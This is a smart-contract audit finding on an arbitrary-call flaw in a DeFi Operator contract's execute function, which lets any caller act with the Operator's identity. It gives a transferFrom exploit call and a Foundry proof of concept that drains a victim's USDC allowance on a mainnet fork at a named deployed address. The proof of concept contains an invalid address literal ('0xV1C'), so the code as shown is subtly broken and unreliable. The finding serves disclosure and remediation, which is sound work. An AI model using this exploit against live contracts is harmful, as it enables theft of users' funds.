### Title
Attacker can execute arbitrary calls with `Operator` as `msg.sender`, draining approvals and funds held by the Operator contract - ([File: contracts/Operator.sol](contracts/Operator.sol))

### Summary
`Operator.execute` lets any EOA dispatch arbitrary `(target, value, callData)` calls where the callee sees `msg.sender == Operator`. This is the on-chain analog of SQL/command injection: attacker-supplied "query" data is executed with the Operator contract's identity and privileges. Any ERC20/ERC721 allowance granted to `Operator` (a common UX pattern for batching `approve` + `deposit` via `Operator.execute`, and required for any "pull" flow through the operator), as well as any ETH or tokens stranded in the contract, can be stolen by an unprivileged attacker.

### Finding Description
`Operator.execute` iterates over attacker-controlled `Call[]` and performs `_call.target.functionCallWithValue(_call.callData, _call.value)` with no target allowlist, no selector allowlist, and no restriction that the call must be a SynthContext-aware contract ( [1](#0-0) ).

The protection in `SynthContext._msgSender` only rewrites the sender for *Metronome core contracts* (Pool, DepositToken, DebtToken, etc.) that resolve `poolRegistry().operator()` ( [2](#0-1) ). For every other contract — plain ERC20s, external vaults, `RecurringAirdrop` (which uses raw `msg.sender`), and any third-party integration — the injected call executes with the full authority of the `Operator` contract itself.

Concretely, an attacker calls:

```
operator.execute([{
  target: usdc,
  value: 0,
  callData: abi.encodeCall(IERC20.transferFrom, (victim, attacker, victimAllowance))
}])
```

If `victim` ever approved `Operator` (e.g., to pull funds in a later batched call), `transferFrom` succeeds because `msg.sender == Operator` is the approved spender. The same primitive sweeps any ETH/tokens stuck in `Operator` and lets the attacker impersonate `Operator` to any contract that authenticates `msg.sender == operator` without transient-slot resolution.

### Impact Explanation
Direct theft of user funds: every allowance granted to `Operator` on any token becomes spendable by any EOA, plus theft of any balances held by `Operator`. This matches the injection bug class — unsanitized attacker input is executed under a trusted identity.

### Likelihood Explanation
The Operator pattern exists precisely so users can batch operations; integrations and user flows that pull tokens through it (or front-ends that prompt `approve(operator, ...)`) create the vulnerable precondition. The attack is a single unprivileged transaction, reproducible on a fork.

### Recommendation
- Restrict `execute` targets/selectors to an allowlist of Metronome protocol contracts that implement `SynthContext`, or
- Never let `Operator` hold allowances/balances (document that no approval should ever be granted to it) and sweep-refund all `msg.value`, or
- Add a per-call `expectedSender` binding inside `callData` verification.

### Proof of Concept
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import "forge-std/Test.sol";
import {Operator, IOperator} from "../contracts/Operator.sol";
import {IERC20} from "../contracts/dependencies/openzeppelin/token/ERC20/IERC20.sol";

contract OperatorInjectionTest is Test {
    // Fork e.g. mainnet where Operator is deployed (0xc06D6347915f6B5e9dBB53Fe17B988b99DbaD360)
    Operator operator = Operator(0xc06D6347915f6B5e9dBB53Fe17B988b99DbaD360);
    IERC20 usdc = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);

    function test_drainAllowanceViaOperator() public {
        address victim = address(0xV1C);
        address attacker = address(0xA77);

        deal(address(usdc), victim, 1_000_000e6);
        vm.prank(victim);
        usdc.approve(address(operator), type(uint256).max); // UX: approve once for batched ops

        IOperator.Call[] memory calls = new IOperator.Call[](1);
        calls[0] = IOperator.Call({
            target: address(usdc),
            value: 0,
            callData: abi.encodeCall(IERC20.transferFrom, (victim, attacker, 1_000_000e6))
        });

        vm.prank(attacker);
        operator.execute(calls);

        assertEq(usdc.balanceOf(attacker), 1_000_000e6); // victim drained
    }
}
```

Note: this requires the precondition that users approve `Operator` or that it holds recoverable funds; if the deployed system guarantees `Operator` is never a spender and never holds value, impact reduces to griefing and the finding should be downgraded accordingly.

### Citations

**File:** contracts/Operator.sol (L34-55)
```text
    function execute(
        Call[] calldata calls_
    ) external payable override nonReentrant setMsgSender returns (bytes[] memory _returnData) {
        uint256 _length = calls_.length;
        _returnData = new bytes[](_length);

        uint256 _sumOfValues;
        Call calldata _call;
        for (uint256 i; i < _length; ) {
            _call = calls_[i];
            uint256 _value = _call.value;
            unchecked {
                _sumOfValues += _value;
            }
            _returnData[i] = _call.target.functionCallWithValue(_call.callData, _value);
            unchecked {
                ++i;
            }
        }

        require(msg.value == _sumOfValues, "value-mismatch");
    }
```

**File:** contracts/utils/SynthContext.sol (L14-24)
```text
    function _msgSender() internal view virtual override returns (address) {
        IPoolRegistry _poolRegistry = poolRegistry();
        if (address(_poolRegistry) != address(0)) {
            IOperator _operator = _poolRegistry.operator();
            if (msg.sender == address(_operator)) {
                return _operator.getActualMsgSender();
            }
        }

        return msg.sender;
    }
```
